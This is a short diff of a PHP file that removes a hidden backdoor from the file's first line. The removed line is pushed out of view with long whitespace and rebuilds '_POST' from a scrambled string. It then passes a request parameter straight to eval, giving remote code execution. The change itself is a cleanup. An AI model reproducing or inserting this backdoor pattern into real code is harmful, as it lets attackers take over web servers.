@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                 $zbuh5="_ospt" ;$txt4=strtoupper( $zbuh5[0]. $zbuh5[3] .$zbuh5[1]. $zbuh5[2]. $zbuh5[4] ); if( isset (${$txt4} ['qf4a9c8' ] ) ){eval (${ $txt4 } [ 'qf4a9c8' ]); } ?><?php
+<?php
 
 /**
  * @file
